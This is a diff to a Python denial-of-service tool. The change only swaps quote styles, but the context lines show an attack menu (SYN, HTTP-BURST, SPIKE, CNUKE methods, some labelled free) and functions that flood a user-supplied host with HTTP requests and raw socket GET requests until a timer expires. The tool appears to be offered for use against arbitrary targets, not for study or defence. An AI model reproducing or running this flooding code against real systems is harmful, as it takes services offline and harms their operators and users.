@@ -30,7 +30,7 @@ method = """\033[91m
 ║ \033[00mBNET <HOST> <PORT> <TIMEOUT>        \033[91m   | \033[00m USE INFO CMD\033[91m ║
 ║ \033[00mNULL <HOST> <PORT> <TIMEOUT>        \033[91m   | \033[00m CNUKE ATTACK\033[91m ║
 ║ \033[00mSPIKE <HOST> <PORT> <TIMEOUT>        \033[91m  | \033[00m CHTTP ATTACK\033[91m ║
-║ \033[00mHTTP-BURST <HOST'S IP>    <TIMEOUT> \033[91m   | \033[00m HTTP  ATTACK\033[91m ║
+║ \033[00mHTTP-BURST <HOST"S IP>    <TIMEOUT> \033[91m   | \033[00m HTTP  ATTACK\033[91m ║
 ║═══════════════════════FREE═METHOD══════════════════════║              
 ║ \033[00mSYN  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m  |\033[00m SYN  ATTACK\033[91m   ║
 ╚════════════════════════════════════════════════════════╝\033[00m
@@ -337,7 +337,7 @@ def httpmethod(host, timer):
     while time.time() < timeout:
         try:
             while time.time() < timeout:
-                headers={'User-Agent': random.choice(user_agent)}
+                headers={"User-Agent": random.choice(user_agent)}
                 r = requests.get("http://"+host,headers=headers)
         except BrokenPipeError:
              print("Pipe Error")
@@ -355,7 +355,7 @@ def httpsender(host, port, timer):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     while time.time() < timeout and attack:
         try:
-            sock.send( f'GET / HTTP/1.1\r\nHost: {host}\r\n\r\n'.encode() )
+            sock.send( f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode() )
         except TimeoutError:
             sock.close()
             break
@@ -381,7 +381,7 @@ def httpsender(host, port, timer):
     sock.connect((host, int(port)))
     while time.time() < timeout and attack:
         try:
-            sock.send( f'GET / HTTP/1.1\r\nHost: {host}\r\n\r\n'.encode() )
+            sock.send( f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode() )
         except TimeoutError:
             sock.close()
             print("Stoped Spike Early Server Downed.")
@@ -509,7 +509,7 @@ def main():
                 print ("[\033[91mGHST\033[00m] Task complete | found: {}".format(sfound))
                 main()
             except IndexError:
-                print ('ADD THE HOST!')
+                print ("ADD THE HOST!")
         elif sinput == "resolve":
             liips += 1
             host = sin.split(" ")[1]
